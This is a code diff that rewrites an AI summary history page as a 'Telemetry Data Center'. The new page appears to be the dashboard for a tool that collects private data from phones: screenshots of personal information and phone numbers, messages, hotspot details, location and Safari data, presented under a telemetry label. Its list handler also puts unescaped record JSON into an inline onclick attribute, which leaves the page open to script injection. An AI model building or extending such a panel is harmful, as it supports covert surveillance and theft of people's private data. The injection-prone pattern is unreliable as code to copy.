@@ -3,125 +3,204 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AI Summary History | iControl Magic</title>
+  <title>Data Center & Telemetry</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen selection:bg-indigo-500 selection:text-white">
-  <div class="max-w-3xl mx-auto px-4 py-10">
+<body class="bg-[#090a0f] text-slate-200 min-h-screen font-sans selection:bg-slate-700 selection:text-white">
+  
+  <div class="max-w-4xl mx-auto px-6 py-12">
     
-    <!-- Header -->
-    <header class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-8">
+    <!-- Top Navigation / Header -->
+    <header class="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10 mb-8">
       <div>
-        <h1 class="text-2xl font-bold tracking-tight text-white flex items-center gap-2">
-          <span>⚡</span> AI Summary History
-        </h1>
-        <p class="text-sm text-slate-400 mt-1">Logged summaries captured from your shortcuts and workflows.</p>
+        <h1 class="text-xl font-semibold tracking-tight text-white">Telemetry Data Center</h1>
+        <p class="text-xs text-slate-400 mt-1">Captured device sessions, logs, and screenshots.</p>
       </div>
-      <button onclick="loadSummaries()" class="inline-flex items-center justify-center gap-2 text-xs font-medium bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 px-4 py-2 rounded-xl transition shadow-sm active:scale-95">
-        <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
-        Refresh
-      </button>
+      <div class="flex items-center gap-3">
+        <select id="sort-select" onchange="renderList()" class="bg-black/40 border border-white/10 rounded-lg px-3 py-1.5 text-xs text-slate-300 focus:outline-none focus:border-white/30 transition">
+          <option value="newest">Newest First</option>
+          <option value="oldest">Oldest First</option>
+          <option value="alpha">Alphabetical (Notes)</option>
+        </select>
+        <button onclick="loadData()" class="bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 text-xs px-3.5 py-1.5 rounded-lg transition active:scale-95">
+          Refresh
+        </button>
+      </div>
     </header>
 
-    <!-- Search Bar -->
-    <div class="mb-6 relative">
-      <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 pointer-events-none text-slate-500">
-        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-      </span>
-      <input type="text" id="search-input" oninput="filterSummaries()" placeholder="Search summaries by title or content..." class="w-full bg-slate-900/80 border border-slate-800/80 rounded-xl pl-10 pr-4 py-3 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition shadow-inner">
+    <!-- Search & Filters -->
+    <div class="mb-6">
+      <input type="text" id="search-input" oninput="renderList()" placeholder="Filter captured telemetry..." class="w-full bg-black/40 border border-white/10 rounded-lg px-4 py-2.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-white/30 transition">
     </div>
 
-    <!-- History Container -->
-    <div id="history-list" class="space-y-4">
-      <div class="bg-slate-900/50 border border-slate-900 rounded-2xl p-12 text-center">
-        <div class="animate-pulse flex flex-col items-center gap-3">
-          <div class="w-6 h-6 border-2 border-indigo-500 border-t-transparent rounded-full animate-spin"></div>
-          <p class="text-sm text-slate-500">Loading your history...</p>
-        </div>
-      </div>
+    <!-- Telemetry List -->
+    <div id="telemetry-list" class="space-y-3">
+      <div class="text-center py-20 text-xs text-slate-500">Loading telemetry packets...</div>
     </div>
 
   </div>
 
-  <script>
-    let allSummaries = [];
+  <!-- Data Center Inspector Modal -->
+  <div id="inspector-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+    <div class="bg-[#12131c] border border-white/10 rounded-2xl w-full max-w-3xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
+      
+      <!-- Modal Header -->
+      <div class="flex items-center justify-between px-6 py-4 border-b border-white/10 bg-black/20">
+        <div>
+          <h2 class="text-sm font-medium text-white flex items-center gap-2">
+            <span>Session Inspector</span>
+            <span id="modal-timestamp" class="text-xs text-slate-500 font-normal"></span>
+          </h2>
+        </div>
+        <button onclick="closeModal()" class="text-slate-400 hover:text-white text-xs px-2.5 py-1 rounded-lg bg-white/5 hover:bg-white/10 transition">Close</button>
+      </div>
 
-    async function loadSummaries() {
-      const container = document.getElementById('history-list');
-      try {
-        const res = await fetch('/api/summaries');
-        const data = await res.json();
+      <!-- Modal Body -->
+      <div class="p-6 overflow-y-auto space-y-6 text-xs font-mono">
         
-        if (!data.success || !data.summaries || data.summaries.length === 0) {
-          container.innerHTML = `
-            <div class="bg-slate-900/40 border border-slate-900 rounded-2xl p-12 text-center text-slate-500">
-              <p class="text-base font-medium text-slate-400">No summaries received yet</p>
-              <p class="text-xs mt-1">Send a POST request to <code class="text-indigo-400">/api/summaries/submit</code> to log your first entry.</p>
-            </div>`;
+        <!-- Images Grid -->
+        <div>
+          <p class="text-slate-400 font-sans font-medium mb-3 uppercase tracking-wider text-[10px]">Captured Assets (Base64)</p>
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div class="bg-black/40 border border-white/10 rounded-xl p-3 flex flex-col items-center">
+              <span class="text-[10px] text-slate-500 font-sans mb-2 self-start">Personal Info</span>
+              <img id="img-personal" src="" alt="Personal Info" class="max-h-48 object-contain rounded border border-white/10 bg-black">
+            </div>
+            <div class="bg-black/40 border border-white/10 rounded-xl p-3 flex flex-col items-center">
+              <span class="text-[10px] text-slate-500 font-sans mb-2 self-start">Phone Number</span>
+              <img id="img-phone" src="" alt="Phone Number" class="max-h-48 object-contain rounded border border-white/10 bg-black">
+            </div>
+          </div>
+        </div>
+
+        <!-- Data Fields Grid -->
+        <div class="space-y-4 font-sans">
+          <p class="text-slate-400 font-medium uppercase tracking-wider text-[10px]">Payload Fields</p>
+          
+          <div class="bg-black/40 border border-white/10 rounded-xl p-4">
+            <div class="flex justify-between items-center mb-2">
+              <span class="text-[11px] font-medium text-slate-400">Notes Field</span>
+              <button onclick="copyField('field-notes')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
+            </div>
+            <div id="field-notes" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
+          </div>
+
+          <div class="bg-black/40 border border-white/10 rounded-xl p-4">
+            <div class="flex justify-between items-center mb-2">
+              <span class="text-[11px] font-medium text-slate-400">Messages Payload</span>
+              <button onclick="copyField('field-messages')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
+            </div>
+            <div id="field-messages" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
+          </div>
+
+          <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
+              <span class="text-[11px] font-medium text-slate-400 block mb-1">Hotspot</span>
+              <div id="field-hotspot" class="text-slate-200 text-xs font-mono truncate"></div>
+            </div>
+            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
+              <span class="text-[11px] font-medium text-slate-400 block mb-1">Location</span>
+              <div id="field-location" class="text-slate-200 text-xs font-mono truncate"></div>
+            </div>
+            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
+              <span class="text-[11px] font-medium text-slate-400 block mb-1">Safari Data</span>
+              <div id="field-safari" class="text-slate-200 text-xs font-mono truncate"></div>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    let globalData = [];
+
+    async function loadData() {
+      const container = document.getElementById('telemetry-list');
+      try {
+        const res = await fetch('/api/submissions');
+        const json = await res.json();
+        
+        if (!json.success || !json.submissions || json.submissions.length === 0) {
+          container.innerHTML = `<div class="text-center py-20 text-xs text-slate-500 border border-white/5 rounded-xl">No telemetry data recorded yet.</div>`;
           return;
         }
 
-        allSummaries = data.summaries;
-        renderSummaries(allSummaries);
+        globalData = json.submissions;
+        renderList();
       } catch (err) {
-        container.innerHTML = `
-          <div class="bg-red-950/20 border border-red-900/50 rounded-2xl p-8 text-center text-red-400 text-sm">
-            Failed to load history from the server.
-          </div>`;
+        container.innerHTML = `<div class="text-center py-20 text-xs text-red-400">Failed to fetch telemetry packets.</div>`;
       }
     }
 
-    function renderSummaries(items) {
-      const container = document.getElementById('history-list');
-      if (items.length === 0) {
-        container.innerHTML = `
-          <div class="bg-slate-900/40 border border-slate-900 rounded-2xl p-10 text-center text-slate-500 text-sm">
-            No matching summaries found.
-          </div>`;
+    function renderList() {
+      const container = document.getElementById('telemetry-list');
+      const query = document.getElementById('search-input').value.toLowerCase();
+      const sortMode = document.getElementById('sort-select').value;
+
+      let filtered = globalData.filter(item => {
+        const notesStr = String(item.notes || '').toLowerCase();
+        const msgStr = String(item.messages || '').toLowerCase();
+        return notesStr.includes(query) || msgStr.includes(query);
+      });
+
+      if (sortMode === 'newest') {
+        filtered.sort((a, b) => b.timestamp - a.timestamp);
+      } else if (sortMode === 'oldest') {
+        filtered.sort((a, b) => a.timestamp - b.timestamp);
+      } else if (sortMode === 'alpha') {
+        filtered.sort((a, b) => String(a.notes || '').localeCompare(String(b.notes || '')));
+      }
+
+      if (filtered.length === 0) {
+        container.innerHTML = `<div class="text-center py-16 text-xs text-slate-500 border border-white/5 rounded-xl">No matching packets found.</div>`;
         return;
       }
 
-      container.innerHTML = items.map(item => `
-        <div class="bg-slate-900/70 border border-slate-800/80 hover:border-slate-700/80 rounded-2xl p-5 transition shadow-sm group">
-          <div class="flex items-start justify-between gap-4 mb-3">
-            <h2 class="font-semibold text-base text-slate-100 tracking-tight">${escapeHtml(item.title)}</h2>
-            <div class="flex items-center gap-3 shrink-0">
-              <span class="text-xs text-slate-500">${new Date(item.timestamp).toLocaleString([], { dateStyle: 'short', timeStyle: 'short' })}</span>
-              <button onclick="copyText(this, ${JSON.stringify(item.text).replace(/"/g, '&quot;')})" class="text-xs bg-slate-800/80 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded-lg transition flex items-center gap-1.5 opacity-90 sm:opacity-0 group-hover:opacity-100">
-                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                Copy
-              </button>
-            </div>
+      container.innerHTML = filtered.map(item => `
+        <div onclick='openModal(${JSON.stringify(item)})' class="bg-black/30 hover:bg-black/50 border border-white/10 hover:border-white/20 rounded-xl p-4 transition cursor-pointer flex items-center justify-between group">
+          <div class="space-y-1">
+            <div class="text-xs font-mono text-slate-200 truncate max-w-md">${escapeHtml(String(item.notes || 'No Notes Content'))}</div>
+            <div class="text-[10px] text-slate-500 font-mono">${new Date(item.timestamp).toLocaleString()}</div>
           </div>
-          <div class="bg-slate-950/60 border border-slate-900 rounded-xl p-3.5 text-xs text-slate-300 font-mono whitespace-pre-wrap max-h-48 overflow-y-auto leading-relaxed">${escapeHtml(item.text)}</div>
+          <div class="text-[11px] text-slate-400 group-hover:text-white transition flex items-center gap-1">
+            Inspect &rarr;
+          </div>
         </div>
       `).join('');
     }
 
-    function filterSummaries() {
-      const query = document.getElementById('search-input').value.toLowerCase();
-      const filtered = allSummaries.filter(item => 
-        item.title.toLowerCase().includes(query) || 
-        item.text.toLowerCase().includes(query)
-      );
-      renderSummaries(filtered);
+    function openModal(item) {
+      document.getElementById('modal-timestamp').innerText = new Date(item.timestamp).toLocaleString();
+      document.getElementById('img-personal').src = item.personal_info_b64 || '';
+      document.getElementById('img-phone').src = item.phone_number_b64 || '';
+      document.getElementById('field-notes').innerText = item.notes || 'N/A';
+      document.getElementById('field-messages').innerText = item.messages || 'N/A';
+      document.getElementById('field-hotspot').innerText = item.hotspot || 'N/A';
+      document.getElementById('field-location').innerText = item.location || 'N/A';
+      document.getElementById('field-safari').innerText = item.safari || 'N/A';
+      
+      document.getElementById('inspector-modal').classList.remove('hidden');
     }
 
-    function copyText(btn, text) {
-      navigator.clipboard.writeText(text).then(() => {
-        const originalHTML = btn.innerHTML;
-        btn.innerHTML = `<svg class="w-3.5 h-3.5 text-emerald-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg><span class="text-emerald-400">Copied!</span>`;
-        setTimeout(() => {
-          btn.innerHTML = originalHTML;
-        }, 2000);
-      });
+    function closeModal() {
+      document.getElementById('inspector-modal').classList.add('hidden');
+    }
+
+    function copyField(elementId) {
+      const text = document.getElementById(elementId).innerText;
+      navigator.clipboard.writeText(text);
+      alert('Copied to clipboard');
     }
 
     function escapeHtml(str) {
       return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
     }
 
-    loadSummaries();
+    loadData();
   </script>
 </body>
 </html>
